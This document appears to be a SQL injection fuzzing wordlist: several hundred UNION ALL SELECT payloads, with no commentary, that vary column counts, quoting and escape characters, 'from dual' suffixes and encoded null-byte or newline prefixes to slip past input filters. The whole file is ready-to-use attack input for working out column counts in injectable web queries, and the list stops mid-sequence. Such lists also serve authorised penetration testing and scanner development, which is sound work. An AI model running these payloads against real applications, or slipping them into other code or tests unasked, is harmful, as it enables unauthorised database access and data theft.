+%00\\' union all select 1337 -- 
+%00\\' union all select 1337 from dual -- 
+%00\\' union all select 1337,1337 -- 
+%00\\' union all select 1337,1337 from dual -- 
+%00\\' union all select 1337,1337,1337 -- 
+%00\\' union all select 1337,1337,1337 from dual -- 
+%00\\' union all select 1337,1337,1337,1337 -- 
+%00\\' union all select 1337,1337,1337,1337 from dual -- 
+%00\\' union all select 1337,1337,1337,1337,1337 -- 
+%00\\' union all select 1337,1337,1337,1337,1337 from dual -- 
+%00\\' union all select null -- 
+%00\\' union all select null from dual -- 
+%00\\' union all select null,null -- 
+%00\\' union all select null,null from dual -- 
+%00\\' union all select null,null,null -- 
+%00\\' union all select null,null,null from dual -- 
+%00\\' union all select null,null,null,null -- 
+%00\\' union all select null,null,null,null from dual -- 
+%00\\' union all select null,null,null,null,null -- 
+%00\\' union all select null,null,null,null,null from dual -- 
+%0a union all select '1337'
+%0a union all select '1337' -- 
+%0a union all select '1337' from dual
+%0a union all select '1337' from dual -- 
+%0a union all select '1337','1337'
+%0a union all select '1337','1337' -- 
+%0a union all select '1337','1337' from dual
+%0a union all select '1337','1337' from dual -- 
+%0a union all select '1337','1337','1337'
+%0a union all select '1337','1337','1337' -- 
+%0a union all select '1337','1337','1337' from dual
+%0a union all select '1337','1337','1337' from dual -- 
+%0a union all select '1337','1337','1337','1337'
+%0a union all select '1337','1337','1337','1337' -- 
+%0a union all select '1337','1337','1337','1337' from dual
+%0a union all select '1337','1337','1337','1337' from dual -- 
+%0a union all select '1337','1337','1337','1337','1337'
+%0a union all select '1337','1337','1337','1337','1337' -- 
+%0a union all select '1337','1337','1337','1337','1337' from dual
+%0a union all select '1337','1337','1337','1337','1337' from dual -- 
+%0a union all select 1337
+%0a union all select 1337 -- 
+%0a union all select 1337 from dual
+%0a union all select 1337 from dual -- 
+%0a union all select 1337,1337
+%0a union all select 1337,1337 -- 
+%0a union all select 1337,1337 from dual
+%0a union all select 1337,1337 from dual -- 
+%0a union all select 1337,1337,1337
+%0a union all select 1337,1337,1337 -- 
+%0a union all select 1337,1337,1337 from dual
+%0a union all select 1337,1337,1337 from dual -- 
+%0a union all select 1337,1337,1337,1337
+%0a union all select 1337,1337,1337,1337 -- 
+%0a union all select 1337,1337,1337,1337 from dual
+%0a union all select 1337,1337,1337,1337 from dual -- 
+%0a union all select 1337,1337,1337,1337,1337
+%0a union all select 1337,1337,1337,1337,1337 -- 
+%0a union all select 1337,1337,1337,1337,1337 from dual
+%0a union all select 1337,1337,1337,1337,1337 from dual -- 
+%0a union all select null
+%0a union all select null -- 
+%0a union all select null from dual
+%0a union all select null from dual -- 
+%0a union all select null,null
+%0a union all select null,null -- 
+%0a union all select null,null from dual
+%0a union all select null,null from dual -- 
+%0a union all select null,null,null
+%0a union all select null,null,null -- 
+%0a union all select null,null,null from dual
+%0a union all select null,null,null from dual -- 
+%0a union all select null,null,null,null
+%0a union all select null,null,null,null -- 
+%0a union all select null,null,null,null from dual
+%0a union all select null,null,null,null from dual -- 
+%0a union all select null,null,null,null,null
+%0a union all select null,null,null,null,null -- 
+%0a union all select null,null,null,null,null from dual
+%0a union all select null,null,null,null,null from dual -- 
+%0a' union all select '1337' -- 
+%0a' union all select '1337' from dual -- 
+%0a' union all select '1337','1337' -- 
+%0a' union all select '1337','1337' from dual -- 
+%0a' union all select '1337','1337','1337' -- 
+%0a' union all select '1337','1337','1337' from dual -- 
+%0a' union all select '1337','1337','1337','1337' -- 
+%0a' union all select '1337','1337','1337','1337' from dual -- 
+%0a' union all select '1337','1337','1337','1337','1337' -- 
+%0a' union all select '1337','1337','1337','1337','1337' from dual -- 
+%0a' union all select 1337 -- 
+%0a' union all select 1337 from dual -- 
+%0a' union all select 1337,1337 -- 
+%0a' union all select 1337,1337 from dual -- 
+%0a' union all select 1337,1337,1337 -- 
+%0a' union all select 1337,1337,1337 from dual -- 
+%0a' union all select 1337,1337,1337,1337 -- 
+%0a' union all select 1337,1337,1337,1337 from dual -- 
+%0a' union all select 1337,1337,1337,1337,1337 -- 
+%0a' union all select 1337,1337,1337,1337,1337 from dual -- 
+%0a' union all select null -- 
+%0a' union all select null from dual -- 
+%0a' union all select null,null -- 
+%0a' union all select null,null from dual -- 
+%0a' union all select null,null,null -- 
+%0a' union all select null,null,null from dual -- 
+%0a' union all select null,null,null,null -- 
+%0a' union all select null,null,null,null from dual -- 
+%0a' union all select null,null,null,null,null -- 
+%0a' union all select null,null,null,null,null from dual -- 
+%0a\' union all select '1337' -- 
+%0a\' union all select '1337' from dual -- 
+%0a\' union all select '1337','1337' -- 
+%0a\' union all select '1337','1337' from dual -- 
+%0a\' union all select '1337','1337','1337' -- 
+%0a\' union all select '1337','1337','1337' from dual -- 
+%0a\' union all select '1337','1337','1337','1337' -- 
+%0a\' union all select '1337','1337','1337','1337' from dual -- 
+%0a\' union all select '1337','1337','1337','1337','1337' -- 
+%0a\' union all select '1337','1337','1337','1337','1337' from dual -- 
+%0a\' union all select 1337 -- 
+%0a\' union all select 1337 from dual -- 
+%0a\' union all select 1337,1337 -- 
+%0a\' union all select 1337,1337 from dual -- 
+%0a\' union all select 1337,1337,1337 -- 
+%0a\' union all select 1337,1337,1337 from dual -- 
+%0a\' union all select 1337,1337,1337,1337 -- 
+%0a\' union all select 1337,1337,1337,1337 from dual -- 
+%0a\' union all select 1337,1337,1337,1337,1337 -- 
+%0a\' union all select 1337,1337,1337,1337,1337 from dual -- 
+%0a\' union all select null -- 
+%0a\' union all select null from dual -- 
+%0a\' union all select null,null -- 
+%0a\' union all select null,null from dual -- 
+%0a\' union all select null,null,null -- 
+%0a\' union all select null,null,null from dual -- 
+%0a\' union all select null,null,null,null -- 
+%0a\' union all select null,null,null,null from dual -- 
+%0a\' union all select null,null,null,null,null -- 
+%0a\' union all select null,null,null,null,null from dual -- 
+%0a\\' union all select '1337' -- 
+%0a\\' union all select '1337' from dual -- 
+%0a\\' union all select '1337','1337' -- 
+%0a\\' union all select '1337','1337' from dual -- 
+%0a\\' union all select '1337','1337','1337' -- 
+%0a\\' union all select '1337','1337','1337' from dual -- 
+%0a\\' union all select '1337','1337','1337','1337' -- 
+%0a\\' union all select '1337','1337','1337','1337' from dual -- 
+%0a\\' union all select '1337','1337','1337','1337','1337' -- 
+%0a\\' union all select '1337','1337','1337','1337','1337' from dual -- 
+%0a\\' union all select 1337 -- 
+%0a\\' union all select 1337 from dual -- 
+%0a\\' union all select 1337,1337 -- 
+%0a\\' union all select 1337,1337 from dual -- 
+%0a\\' union all select 1337,1337,1337 -- 
+%0a\\' union all select 1337,1337,1337 from dual -- 
+%0a\\' union all select 1337,1337,1337,1337 -- 
+%0a\\' union all select 1337,1337,1337,1337 from dual -- 
+%0a\\' union all select 1337,1337,1337,1337,1337 -- 
+%0a\\' union all select 1337,1337,1337,1337,1337 from dual -- 
+%0a\\' union all select null -- 
+%0a\\' union all select null from dual -- 
+%0a\\' union all select null,null -- 
+%0a\\' union all select null,null from dual -- 
+%0a\\' union all select null,null,null -- 
+%0a\\' union all select null,null,null from dual -- 
+%0a\\' union all select null,null,null,null -- 
+%0a\\' union all select null,null,null,null from dual -- 
+%0a\\' union all select null,null,null,null,null -- 
+%0a\\' union all select null,null,null,null,null from dual -- 
+%0d%0a union all select '1337'
+%0d%0a union all select '1337' -- 
+%0d%0a union all select '1337' from dual
+%0d%0a union all select '1337' from dual -- 
+%0d%0a union all select '1337','1337'
+%0d%0a union all select '1337','1337' -- 
+%0d%0a union all select '1337','1337' from dual
+%0d%0a union all select '1337','1337' from dual -- 
+%0d%0a union all select '1337','1337','1337'
+%0d%0a union all select '1337','1337','1337' -- 
+%0d%0a union all select '1337','1337','1337' from dual
+%0d%0a union all select '1337','1337','1337' from dual -- 
+%0d%0a union all select '1337','1337','1337','1337'
+%0d%0a union all select '1337','1337','1337','1337' -- 
+%0d%0a union all select '1337','1337','1337','1337' from dual
+%0d%0a union all select '1337','1337','1337','1337' from dual -- 
+%0d%0a union all select '1337','1337','1337','1337','1337'
+%0d%0a union all select '1337','1337','1337','1337','1337' -- 
+%0d%0a union all select '1337','1337','1337','1337','1337' from dual
+%0d%0a union all select '1337','1337','1337','1337','1337' from dual -- 
+%0d%0a union all select 1337
+%0d%0a union all select 1337 -- 
+%0d%0a union all select 1337 from dual
+%0d%0a union all select 1337 from dual -- 
+%0d%0a union all select 1337,1337
+%0d%0a union all select 1337,1337 -- 
+%0d%0a union all select 1337,1337 from dual
+%0d%0a union all select 1337,1337 from dual -- 
+%0d%0a union all select 1337,1337,1337
+%0d%0a union all select 1337,1337,1337 -- 
+%0d%0a union all select 1337,1337,1337 from dual
+%0d%0a union all select 1337,1337,1337 from dual -- 
+%0d%0a union all select 1337,1337,1337,1337
+%0d%0a union all select 1337,1337,1337,1337 -- 
+%0d%0a union all select 1337,1337,1337,1337 from dual
+%0d%0a union all select 1337,1337,1337,1337 from dual -- 
+%0d%0a union all select 1337,1337,1337,1337,1337
+%0d%0a union all select 1337,1337,1337,1337,1337 -- 
+%0d%0a union all select 1337,1337,1337,1337,1337 from dual
+%0d%0a union all select 1337,1337,1337,1337,1337 from dual -- 
+%0d%0a union all select null
+%0d%0a union all select null -- 
+%0d%0a union all select null from dual
+%0d%0a union all select null from dual -- 
+%0d%0a union all select null,null
+%0d%0a union all select null,null -- 
+%0d%0a union all select null,null from dual
+%0d%0a union all select null,null from dual -- 
+%0d%0a union all select null,null,null
+%0d%0a union all select null,null,null -- 
+%0d%0a union all select null,null,null from dual
+%0d%0a union all select null,null,null from dual -- 
+%0d%0a union all select null,null,null,null
+%0d%0a union all select null,null,null,null -- 
+%0d%0a union all select null,null,null,null from dual
+%0d%0a union all select null,null,null,null from dual -- 
+%0d%0a union all select null,null,null,null,null
+%0d%0a union all select null,null,null,null,null -- 
+%0d%0a union all select null,null,null,null,null from dual
+%0d%0a union all select null,null,null,null,null from dual -- 
+%0d%0a' union all select '1337' -- 
+%0d%0a' union all select '1337' from dual -- 
+%0d%0a' union all select '1337','1337' -- 
+%0d%0a' union all select '1337','1337' from dual -- 
+%0d%0a' union all select '1337','1337','1337' -- 
+%0d%0a' union all select '1337','1337','1337' from dual -- 
+%0d%0a' union all select '1337','1337','1337','1337' -- 
+%0d%0a' union all select '1337','1337','1337','1337' from dual -- 
+%0d%0a' union all select '1337','1337','1337','1337','1337' -- 
+%0d%0a' union all select '1337','1337','1337','1337','1337' from dual -- 
+%0d%0a' union all select 1337 -- 
+%0d%0a' union all select 1337 from dual -- 
+%0d%0a' union all select 1337,1337 -- 
+%0d%0a' union all select 1337,1337 from dual -- 
+%0d%0a' union all select 1337,1337,1337 -- 
+%0d%0a' union all select 1337,1337,1337 from dual -- 
+%0d%0a' union all select 1337,1337,1337,1337 -- 
+%0d%0a' union all select 1337,1337,1337,1337 from dual -- 
+%0d%0a' union all select 1337,1337,1337,1337,1337 -- 
+%0d%0a' union all select 1337,1337,1337,1337,1337 from dual -- 
+%0d%0a' union all select null -- 
+%0d%0a' union all select null from dual -- 
+%0d%0a' union all select null,null -- 
+%0d%0a' union all select null,null from dual -- 
+%0d%0a' union all select null,null,null -- 
+%0d%0a' union all select null,null,null from dual -- 
+%0d%0a' union all select null,null,null,null -- 
+%0d%0a' union all select null,null,null,null from dual -- 
+%0d%0a' union all select null,null,null,null,null -- 
+%0d%0a' union all select null,null,null,null,null from dual -- 
+%0d%0a\' union all select '1337' -- 
+%0d%0a\' union all select '1337' from dual -- 
+%0d%0a\' union all select '1337','1337' -- 
+%0d%0a\' union all select '1337','1337' from dual -- 
+%0d%0a\' union all select '1337','1337','1337' -- 
+%0d%0a\' union all select '1337','1337','1337' from dual -- 
+%0d%0a\' union all select '1337','1337','1337','1337' -- 
+%0d%0a\' union all select '1337','1337','1337','1337' from dual -- 
+%0d%0a\' union all select '1337','1337','1337','1337','1337' -- 
+%0d%0a\' union all select '1337','1337','1337','1337','1337' from dual -- 
+%0d%0a\' union all select 1337 -- 
+%0d%0a\' union all select 1337 from dual -- 
+%0d%0a\' union all select 1337,1337 -- 
+%0d%0a\' union all select 1337,1337 from dual -- 
+%0d%0a\' union all select 1337,1337,1337 -- 
+%0d%0a\' union all select 1337,1337,1337 from dual -- 
+%0d%0a\' union all select 1337,1337,1337,1337 -- 
+%0d%0a\' union all select 1337,1337,1337,1337 from dual -- 
+%0d%0a\' union all select 1337,1337,1337,1337,1337 -- 
+%0d%0a\' union all select 1337,1337,1337,1337,1337 from dual -- 
+%0d%0a\' union all select null -- 
+%0d%0a\' union all select null from dual -- 
+%0d%0a\' union all select null,null -- 
+%0d%0a\' union all select null,null from dual -- 
+%0d%0a\' union all select null,null,null -- 
+%0d%0a\' union all select null,null,null from dual -- 
+%0d%0a\' union all select null,null,null,null -- 
+%0d%0a\' union all select null,null,null,null from dual -- 
+%0d%0a\' union all select null,null,null,null,null -- 
+%0d%0a\' union all select null,null,null,null,null from dual -- 
+%0d%0a\\' union all select '1337' -- 
+%0d%0a\\' union all select '1337' from dual -- 
+%0d%0a\\' union all select '1337','1337' -- 
+%0d%0a\\' union all select '1337','1337' from dual -- 
+%0d%0a\\' union all select '1337','1337','1337' -- 
+%0d%0a\\' union all select '1337','1337','1337' from dual -- 
+%0d%0a\\' union all select '1337','1337','1337','1337' -- 
+%0d%0a\\' union all select '1337','1337','1337','1337' from dual -- 
+%0d%0a\\' union all select '1337','1337','1337','1337','1337' -- 
+%0d%0a\\' union all select '1337','1337','1337','1337','1337' from dual -- 
+%0d%0a\\' union all select 1337 -- 
+%0d%0a\\' union all select 1337 from dual -- 
+%0d%0a\\' union all select 1337,1337 -- 
+%0d%0a\\' union all select 1337,1337 from dual -- 
+%0d%0a\\' union all select 1337,1337,1337 -- 
+%0d%0a\\' union all select 1337,1337,1337 from dual -- 
+%0d%0a\\' union all select 1337,1337,1337,1337 -- 
+%0d%0a\\' union all select 1337,1337,1337,1337 from dual -- 
+%0d%0a\\' union all select 1337,1337,1337,1337,1337 -- 
+%0d%0a\\' union all select 1337,1337,1337,1337,1337 from dual -- 
+%0d%0a\\' union all select null -- 
+%0d%0a\\' union all select null from dual -- 
+%0d%0a\\' union all select null,null -- 
+%0d%0a\\' union all select null,null from dual -- 
+%0d%0a\\' union all select null,null,null -- 
+%0d%0a\\' union all select null,null,null from dual -- 
+%0d%0a\\' union all select null,null,null,null -- 
+%0d%0a\\' union all select null,null,null,null from dual -- 
+%0d%0a\\' union all select null,null,null,null,null -- 
+%0d%0a\\' union all select null,null,null,null,null from dual -- 
+' union all select '1337' -- 
+' union all select '1337' from dual -- 
+' union all select '1337','1337' -- 
+' union all select '1337','1337' from dual -- 
+' union all select '1337','1337','1337' -- 
+' union all select '1337','1337','1337' from dual -- 
+' union all select '1337','1337','1337','1337' -- 
+' union all select '1337','1337','1337','1337' from dual -- 
+' union all select '1337','1337','1337','1337','1337' -- 
+' union all select '1337','1337','1337','1337','1337' from dual -- 
+' union all select 1337 -- 
+' union all select 1337 from dual -- 
+' union all select 1337,1337 -- 
+' union all select 1337,1337 from dual -- 
+' union all select 1337,1337,1337 -- 
+' union all select 1337,1337,1337 from dual -- 
+' union all select 1337,1337,1337,1337 -- 
+' union all select 1337,1337,1337,1337 from dual -- 
+' union all select 1337,1337,1337,1337,1337 -- 
+' union all select 1337,1337,1337,1337,1337 from dual -- 
+' union all select null -- 
+' union all select null from dual -- 
+' union all select null,null -- 
+' union all select null,null from dual -- 
+' union all select null,null,null -- 
+' union all select null,null,null from dual -- 
+' union all select null,null,null,null -- 
+' union all select null,null,null,null from dual -- 
+' union all select null,null,null,null,null -- 
+' union all select null,null,null,null,null from dual -- 
+0x00 union all select '1337'
+0x00 union all select '1337' -- 
+0x00 union all select '1337' from dual
+0x00 union all select '1337' from dual -- 
+0x00 union all select '1337','1337'
+0x00 union all select '1337','1337' -- 
+0x00 union all select '1337','1337' from dual
+0x00 union all select '1337','1337' from dual -- 
+0x00 union all select '1337','1337','1337'
+0x00 union all select '1337','1337','1337' -- 
+0x00 union all select '1337','1337','1337' from dual
+0x00 union all select '1337','1337','1337' from dual -- 
+0x00 union all select '1337','1337','1337','1337'
+0x00 union all select '1337','1337','1337','1337' -- 
+0x00 union all select '1337','1337','1337','1337' from dual
+0x00 union all select '1337','1337','1337','1337' from dual -- 
+0x00 union all select '1337','1337','1337','1337','1337'
+0x00 union all select '1337','1337','1337','1337','1337' -- 
+0x00 union all select '1337','1337','1337','1337','1337' from dual
+0x00 union all select '1337','1337','1337','1337','1337' from dual -- 
+0x00 union all select 1337
+0x00 union all select 1337 -- 
+0x00 union all select 1337 from dual
+0x00 union all select 1337 from dual -- 
+0x00 union all select 1337,1337
+0x00 union all select 1337,1337 -- 
+0x00 union all select 1337,1337 from dual
+0x00 union all select 1337,1337 from dual -- 
+0x00 union all select 1337,1337,1337
+0x00 union all select 1337,1337,1337 -- 
+0x00 union all select 1337,1337,1337 from dual
+0x00 union all select 1337,1337,1337 from dual -- 
+0x00 union all select 1337,1337,1337,1337
+0x00 union all select 1337,1337,1337,1337 -- 
+0x00 union all select 1337,1337,1337,1337 from dual
+0x00 union all select 1337,1337,1337,1337 from dual -- 
+0x00 union all select 1337,1337,1337,1337,1337
+0x00 union all select 1337,1337,1337,1337,1337 -- 
+0x00 union all select 1337,1337,1337,1337,1337 from dual
+0x00 union all select 1337,1337,1337,1337,1337 from dual -- 
+0x00 union all select null
+0x00 union all select null -- 
+0x00 union all select null from dual
+0x00 union all select null from dual -- 
+0x00 union all select null,null
+0x00 union all select null,null -- 
+0x00 union all select null,null from dual
+0x00 union all select null,null from dual -- 
+0x00 union all select null,null,null
+0x00 union all select null,null,null -- 
+0x00 union all select null,null,null from dual
+0x00 union all select null,null,null from dual -- 
+0x00 union all select null,null,null,null
+0x00 union all select null,null,null,null -- 
+0x00 union all select null,null,null,null from dual
+0x00 union all select null,null,null,null from dual -- 
+0x00 union all select null,null,null,null,null
+0x00 union all select null,null,null,null,null -- 
+0x00 union all select null,null,null,null,null from dual
+0x00 union all select null,null,null,null,null from dual -- 
+0x00' union all select '1337' -- 
+0x00' union all select '1337' from dual -- 
+0x00' union all select '1337','1337' -- 
+0x00' union all select '1337','1337' from dual -- 
+0x00' union all select '1337','1337','1337' -- 
+0x00' union all select '1337','1337','1337' from dual -- 
+0x00' union all select '1337','1337','1337','1337' -- 
+0x00' union all select '1337','1337','1337','1337' from dual -- 
+0x00' union all select '1337','1337','1337','1337','1337' -- 
+0x00' union all select '1337','1337','1337','1337','1337' from dual -- 
+0x00' union all select 1337 -- 
+0x00' union all select 1337 from dual -- 
+0x00' union all select 1337,1337 -- 
+0x00' union all select 1337,1337 from dual -- 
+0x00' union all select 1337,1337,1337 -- 
+0x00' union all select 1337,1337,1337 from dual -- 
+0x00' union all select 1337,1337,1337,1337 -- 
+0x00' union all select 1337,1337,1337,1337 from dual -- 
+0x00' union all select 1337,1337,1337,1337,1337 -- 
+0x00' union all select 1337,1337,1337,1337,1337 from dual -- 
+0x00' union all select null -- 
+0x00' union all select null from dual -- 
+0x00' union all select null,null -- 
+0x00' union all select null,null from dual -- 
+0x00' union all select null,null,null -- 
+0x00' union all select null,null,null from dual -- 
+0x00' union all select null,null,null,null -- 
+0x00' union all select null,null,null,null from dual -- 
+0x00' union all select null,null,null,null,null -- 
+0x00' union all select null,null,null,null,null from dual -- 
+0x00\' union all select '1337' -- 
+0x00\' union all select '1337' from dual -- 
+0x00\' union all select '1337','1337' -- 
+0x00\' union all select '1337','1337' from dual -- 
+0x00\' union all select '1337','1337','1337' -- 
+0x00\' union all select '1337','1337','1337' from dual -- 
+0x00\' union all select '1337','1337','1337','1337' -- 
+0x00\' union all select '1337','1337','1337','1337' from dual -- 
+0x00\' union all select '1337','1337','1337','1337','1337' -- 
+0x00\' union all select '1337','1337','1337','1337','1337' from dual -- 
+0x00\' union all select 1337 -- 
+0x00\' union all select 1337 from dual -- 
+0x00\' union all select 1337,1337 -- 
+0x00\' union all select 1337,1337 from dual -- 
+0x00\' union all select 1337,1337,1337 -- 
+0x00\' union all select 1337,1337,1337 from dual -- 
+0x00\' union all select 1337,1337,1337,1337 -- 
+0x00\' union all select 1337,1337,1337,1337 from dual -- 
+0x00\' union all select 1337,1337,1337,1337,1337 -- 
+0x00\' union all select 1337,1337,1337,1337,1337 from dual -- 
+0x00\' union all select null -- 
+0x00\' union all select null from dual -- 
+0x00\' union all select null,null -- 
+0x00\' union all select null,null from dual -- 
+0x00\' union all select null,null,null -- 
+0x00\' union all select null,null,null from dual -- 
+0x00\' union all select null,null,null,null -- 
+0x00\' union all select null,null,null,null from dual -- 
+0x00\' union all select null,null,null,null,null -- 
+0x00\' union all select null,null,null,null,null from dual -- 
+0x00\\' union all select '1337' -- 
+0x00\\' union all select '1337' from dual -- 
+0x00\\' union all select '1337','1337' -- 
+0x00\\' union all select '1337','1337' from dual -- 
+0x00\\' union all select '1337','1337','1337' -- 
+0x00\\' union all select '1337','1337','1337' from dual -- 
+0x00\\' union all select '1337','1337','1337','1337' -- 
+0x00\\' union all select '1337','1337','1337','1337' from dual -- 
+0x00\\' union all select '1337','1337','1337','1337','1337' -- 
+0x00\\' union all select '1337','1337','1337','1337','1337' from dual -- 
+0x00\\' union all select 1337 -- 
+0x00\\' union all select 1337 from dual -- 
+0x00\\' union all select 1337,1337 -- 
+0x00\\' union all select 1337,1337 from dual -- 
+0x00\\' union all select 1337,1337,1337 -- 
+0x00\\' union all select 1337,1337,1337 from dual -- 
+0x00\\' union all select 1337,1337,1337,1337 -- 
+0x00\\' union all select 1337,1337,1337,1337 from dual -- 
+0x00\\' union all select 1337,1337,1337,1337,1337 -- 
+0x00\\' union all select 1337,1337,1337,1337,1337 from dual -- 
+0x00\\' union all select null -- 
+0x00\\' union all select null from dual -- 
+0x00\\' union all select null,null -- 
+0x00\\' union all select null,null from dual -- 
+0x00\\' union all select null,null,null -- 
+0x00\\' union all select null,null,null from dual -- 
+0x00\\' union all select null,null,null,null -- 
+0x00\\' union all select null,null,null,null from dual -- 
+0x00\\' union all select null,null,null,null,null -- 
+0x00\\' union all select null,null,null,null,null from dual -- 
+0x0a union all select '1337'
+0x0a union all select '1337' -- 
+0x0a union all select '1337' from dual
+0x0a union all select '1337' from dual -- 
+0x0a union all select '1337','1337'
+0x0a union all select '1337','1337' -- 
+0x0a union all select '1337','1337' from dual
+0x0a union all select '1337','1337' from dual -- 
+0x0a union all select '1337','1337','1337'
+0x0a union all select '1337','1337','1337' -- 
+0x0a union all select '1337','1337','1337' from dual
+0x0a union all select '1337','1337','1337' from dual -- 
+0x0a union all select '1337','1337','1337','1337'
+0x0a union all select '1337','1337','1337','1337' -- 
+0x0a union all select '1337','1337','1337','1337' from dual
+0x0a union all select '1337','1337','1337','1337' from dual -- 
+0x0a union all select '1337','1337','1337','1337','1337'
+0x0a union all select '1337','1337','1337','1337','1337' -- 
+0x0a union all select '1337','1337','1337','1337','1337' from dual
+0x0a union all select '1337','1337','1337','1337','1337' from dual -- 
+0x0a union all select 1337
+0x0a union all select 1337 -- 
+0x0a union all select 1337 from dual
+0x0a union all select 1337 from dual -- 
+0x0a union all select 1337,1337
+0x0a union all select 1337,1337 -- 
+0x0a union all select 1337,1337 from dual
+0x0a union all select 1337,1337 from dual -- 
+0x0a union all select 1337,1337,1337
+0x0a union all select 1337,1337,1337 -- 
+0x0a union all select 1337,1337,1337 from dual
+0x0a union all select 1337,1337,1337 from dual -- 
+0x0a union all select 1337,1337,1337,1337
+0x0a union all select 1337,1337,1337,1337 -- 
+0x0a union all select 1337,1337,1337,1337 from dual
+0x0a union all select 1337,1337,1337,1337 from dual -- 
+0x0a union all select 1337,1337,1337,1337,1337
+0x0a union all select 1337,1337,1337,1337,1337 -- 
+0x0a union all select 1337,1337,1337,1337,1337 from dual
+0x0a union all select 1337,1337,1337,1337,1337 from dual -- 
+0x0a union all select null
+0x0a union all select null -- 
+0x0a union all select null from dual
+0x0a union all select null from dual -- 
+0x0a union all select null,null
+0x0a union all select null,null -- 
+0x0a union all select null,null from dual
+0x0a union all select null,null from dual -- 
+0x0a union all select null,null,null
+0x0a union all select null,null,null -- 
+0x0a union all select null,null,null from dual
+0x0a union all select null,null,null from dual -- 
+0x0a union all select null,null,null,null
+0x0a union all select null,null,null,null -- 
+0x0a union all select null,null,null,null from dual
+0x0a union all select null,null,null,null from dual -- 
+0x0a union all select null,null,null,null,null
+0x0a union all select null,null,null,null,null -- 
+0x0a union all select null,null,null,null,null from dual
+0x0a union all select null,null,null,null,null from dual -- 
+0x0a' union all select '1337' -- 
+0x0a' union all select '1337' from dual -- 
+0x0a' union all select '1337','1337' -- 
+0x0a' union all select '1337','1337' from dual -- 
+0x0a' union all select '1337','1337','1337' -- 
+0x0a' union all select '1337','1337','1337' from dual -- 
+0x0a' union all select '1337','1337','1337','1337' -- 
+0x0a' union all select '1337','1337','1337','1337' from dual -- 
+0x0a' union all select '1337','1337','1337','1337','1337' -- 
+0x0a' union all select '1337','1337','1337','1337','1337' from dual -- 
+0x0a' union all select 1337 -- 
+0x0a' union all select 1337 from dual -- 
+0x0a' union all select 1337,1337 -- 
+0x0a' union all select 1337,1337 from dual -- 
+0x0a' union all select 1337,1337,1337 -- 
+0x0a' union all select 1337,1337,1337 from dual -- 
+0x0a' union all select 1337,1337,1337,1337 -- 
+0x0a' union all select 1337,1337,1337,1337 from dual -- 
+0x0a' union all select 1337,1337,1337,1337,1337 -- 
+0x0a' union all select 1337,1337,1337,1337,1337 from dual -- 
+0x0a' union all select null -- 
+0x0a' union all select null from dual -- 
+0x0a' union all select null,null -- 
+0x0a' union all select null,null from dual -- 
+0x0a' union all select null,null,null -- 
+0x0a' union all select null,null,null from dual -- 
+0x0a' union all select null,null,null,null -- 
+0x0a' union all select null,null,null,null from dual -- 
+0x0a' union all select null,null,null,null,null -- 
+0x0a' union all select null,null,null,null,null from dual -- 
+0x0a\' union all select '1337' -- 
+0x0a\' union all select '1337' from dual -- 
+0x0a\' union all select '1337','1337' -- 
+0x0a\' union all select '1337','1337' from dual -- 
+0x0a\' union all select '1337','1337','1337' -- 
+0x0a\' union all select '1337','1337','1337' from dual -- 
+0x0a\' union all select '1337','1337','1337','1337' -- 
+0x0a\' union all select '1337','1337','1337','1337' from dual -- 
+0x0a\' union all select '1337','1337','1337','1337','1337' -- 
+0x0a\' union all select '1337','1337','1337','1337','1337' from dual -- 
+0x0a\' union all select 1337 -- 
+0x0a\' union all select 1337 from dual -- 
+0x0a\' union all select 1337,1337 -- 
+0x0a\' union all select 1337,1337 from dual -- 
+0x0a\' union all select 1337,1337,1337 -- 
+0x0a\' union all select 1337,1337,1337 from dual -- 
+0x0a\' union all select 1337,1337,1337,1337 -- 
+0x0a\' union all select 1337,1337,1337,1337 from dual -- 
+0x0a\' union all select 1337,1337,1337,1337,1337 -- 
+0x0a\' union all select 1337,1337,1337,1337,1337 from dual -- 
+0x0a\' union all select null -- 
+0x0a\' union all select null from dual -- 
+0x0a\' union all select null,null -- 
+0x0a\' union all select null,null from dual -- 
+0x0a\' union all select null,null,null -- 
+0x0a\' union all select null,null,null from dual -- 
+0x0a\' union all select null,null,null,null -- 
+0x0a\' union all select null,null,null,null from dual -- 
+0x0a\' union all select null,null,null,null,null -- 
+0x0a\' union all select null,null,null,null,null from dual -- 
+0x0a\\' union all select '1337' -- 
+0x0a\\' union all select '1337' from dual -- 
+0x0a\\' union all select '1337','1337' -- 
+0x0a\\' union all select '1337','1337' from dual -- 
+0x0a\\' union all select '1337','1337','1337' -- 
+0x0a\\' union all select '1337','1337','1337' from dual -- 
+0x0a\\' union all select '1337','1337','1337','1337' -- 
+0x0a\\' union all select '1337','1337','1337','1337' from dual -- 
+0x0a\\' union all select '1337','1337','1337','1337','1337' -- 
+0x0a\\' union all select '1337','1337','1337','1337','1337' from dual -- 
+0x0a\\' union all select 1337 -- 
+0x0a\\' union all select 1337 from dual -- 
+0x0a\\' union all select 1337,1337 -- 
+0x0a\\' union all select 1337,1337 from dual -- 
+0x0a\\' union all select 1337,1337,1337 -- 
+0x0a\\' union all select 1337,1337,1337 from dual -- 
+0x0a\\' union all select 1337,1337,1337,1337 -- 
+0x0a\\' union all select 1337,1337,1337,1337 from dual -- 
+0x0a\\' union all select 1337,1337,1337,1337,1337 -- 
+0x0a\\' union all select 1337,1337,1337,1337,1337 from dual -- 
+0x0a\\' union all select null -- 
+0x0a\\' union all select null from dual -- 
+0x0a\\' union all select null,null -- 
+0x0a\\' union all select null,null from dual -- 
+0x0a\\' union all select null,null,null -- 
+0x0a\\' union all select null,null,null from dual -- 
+0x0a\\' union all select null,null,null,null -- 
+0x0a\\' union all select null,null,null,null from dual -- 
+0x0a\\' union all select null,null,null,null,null -- 
+0x0a\\' union all select null,null,null,null,null from dual -- 
+0x0d0a union all select '1337'
+0x0d0a union all select '1337' -- 
+0x0d0a union all select '1337' from dual
+0x0d0a union all select '1337' from dual -- 
+0x0d0a union all select '1337','1337'
+0x0d0a union all select '1337','1337' -- 
+0x0d0a union all select '1337','1337' from dual
+0x0d0a union all select '1337','1337' from dual -- 
+0x0d0a union all select '1337','1337','1337'
+0x0d0a union all select '1337','1337','1337' -- 
+0x0d0a union all select '1337','1337','1337' from dual
+0x0d0a union all select '1337','1337','1337' from dual -- 
+0x0d0a union all select '1337','1337','1337','1337'
+0x0d0a union all select '1337','1337','1337','1337' -- 
+0x0d0a union all select '1337','1337','1337','1337' from dual
+0x0d0a union all select '1337','1337','1337','1337' from dual -- 
+0x0d0a union all select '1337','1337','1337','1337','1337'
+0x0d0a union all select '1337','1337','1337','1337','1337' -- 
+0x0d0a union all select '1337','1337','1337','1337','1337' from dual
+0x0d0a union all select '1337','1337','1337','1337','1337' from dual -- 
+0x0d0a union all select 1337
